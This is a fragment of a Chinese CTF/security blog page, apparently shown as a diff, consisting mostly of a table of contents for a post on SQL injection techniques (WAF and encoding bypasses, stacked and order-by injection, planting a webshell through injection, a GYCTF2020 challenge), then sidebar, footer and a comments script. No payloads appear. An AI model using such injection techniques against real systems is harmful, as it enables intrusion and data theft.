href="#join%E5%87%BD%E6%95%B0%E8%BE%85%E5%8A%A9%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.7.1.</span> <span class="nav-text">join函数辅助注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.8.</span> <span class="nav-text">大小于号被过滤的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.9.</span> <span class="nav-text">等号被过滤的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%AC%E5%8F%B7-%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5-union%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.10.</span> <span class="nav-text">括号()被过滤的注入 | union盲注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E6%9C%89WAF%E9%98%B2%E5%BE%A1%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.11.</span> <span class="nav-text">具有WAF防御的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="nav-number">1.2.12.</span> <span class="nav-text">引号被转义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.13.</span> <span class="nav-text">编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#urlencode%E7%BB%95%E8%BF%87waf"><span class="nav-number">1.2.13.1.</span> <span class="nav-text">urlencode绕过waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.13.2.</span> <span class="nav-text">二次解码绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL%E5%AD%97%E7%AC%A6%E9%9B%86%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.14.</span> <span class="nav-text">MySQL字符集绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%92%8Cunion-select%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.3.1.</span> <span class="nav-text">堆叠注入和union select的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-number">1.3.2.</span> <span class="nav-text">堆叠注入的局限性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E4%BD%BF%E7%94%A8select%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.3.</span> <span class="nav-text">不使用select语句进行注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%951"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">法1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%952"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">法2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GYCTF2020-Blacklist"><span class="nav-number">1.3.4.</span> <span class="nav-text">[GYCTF2020]Blacklist</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9SQL%E9%85%8D%E7%BD%AE%E7%9A%84%E6%96%B0%E7%9F%A5%E8%AF%86"><span class="nav-number">1.3.5.</span> <span class="nav-text">修改SQL配置的新知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ps-1"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">ps</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">order by注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rand-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">rand()注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.2.</span> <span class="nav-text">时间盲注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#procedure-analyse%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.3.</span> <span class="nav-text">procedure analyse报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.4.</span> <span class="nav-text">聚合函数注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E6%9C%A8%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.5.</span> <span class="nav-text">导入木马注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.5.</span> <span class="nav-text">SQL弱类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PDO-desc%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">PDO desc注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PostgreSQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.7.</span> <span class="nav-text">PostgreSQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-8-0%E7%89%B9%E6%80%A7"><span class="nav-number">1.8.</span> <span class="nav-text">MySQL 8.0特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E6%88%AA%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-number">1.9.</span> <span class="nav-text">SQL中的字符截取函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-2"><span class="nav-number">1.10.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#END"><span class="nav-number">1.11.</span> <span class="nav-text">END</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
